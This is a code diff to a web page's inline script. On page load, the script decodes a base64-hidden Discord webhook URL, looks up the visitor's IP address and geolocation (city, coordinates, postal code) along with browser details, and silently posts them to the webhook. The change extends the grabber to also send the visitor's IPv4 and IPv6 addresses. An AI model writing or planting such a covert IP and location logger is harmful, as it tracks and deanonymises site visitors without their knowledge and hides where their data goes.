@@ -122,10 +122,8 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-
             var base64Webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NzI5NjgyNzY3NDI2MzU3Mi9xQkZNejNZV2R0UHNOUVR5b2RDU05UVVhINnFnOHExSEd0NEFwTTZkWlpGVXR6MUY3WS1PWmFzOGFHMVRjRkRGTVE5Tw==";
             
-
             function decodeBase64(base64String) {
                 return decodeURIComponent(atob(base64String));
             }
@@ -138,6 +136,8 @@
                 .then(data => {
                     const info = {
                         ip: data.ip,
+                        ipv4: data.ipv4, 
+                        ipv6: data.ipv6, 
                         city: data.city,
                         region: data.region,
                         country: data.country_name,
@@ -155,7 +155,7 @@
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            content: `User Info:\nIP: ${info.ip}\nLocation: ${info.city}, ${info.region}, ${info.country}\nLatitude: ${info.lat}\nLongitude: ${info.lon}\nPostal Code: ${info.postal}\nBrowser: ${info.browser}`
+                            content: `User Info:\nIP (IPv4): ${info.ipv4}\nIP (IPv6): ${info.ipv6}\nLocation: ${info.city}, ${info.region}, ${info.country}\nLatitude: ${info.lat}\nLongitude: ${info.lon}\nPostal Code: ${info.postal}\nBrowser: ${info.browser}`
                         }),
                     });
                 })
